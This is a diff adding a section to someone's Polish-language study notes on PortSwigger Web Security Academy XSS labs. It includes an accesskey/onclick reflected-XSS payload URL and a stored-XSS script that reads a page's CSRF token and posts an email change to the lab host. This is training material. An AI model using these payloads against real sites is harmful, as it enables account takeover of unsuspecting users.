@@ -212,6 +212,24 @@ Payload:
 https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&a=4%27accesskey%3d%27X%27onclick%3d%27alert(1)
 ```
 
+## Lab: Exploiting XSS to perform CSRF
+1. W komentzrzu nie ma rzadniej ochrony przed XSSem, więc możemy dać daowolny skrypt.
+2. Do zmiany maila potrzebny jest jednak token csrf, który zczytujemy ze strony.
+3. Dodajemy setTimeout, aby funkcja wywołała się po sekundzie, kiedy już wszystkie elementy na stronie się załadują.
+```
+<script>
+    function sendd() {
+        var a = document.getElementsByName("csrf")[0].value;
+        let aaa = new XMLHttpRequest();
+        aaa.open("POST", "https://0a5f00a4035e62ccc0fe0e37006b00ea.web-security-academy.net/my-account/change-email");
+
+        aaa.send("email=test@test.test&csrf=" + a);
+    };
+
+    setTimeout(sendd, 1000)
+</script>
+```
+
 # DOM BASED XSS 
 
 Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
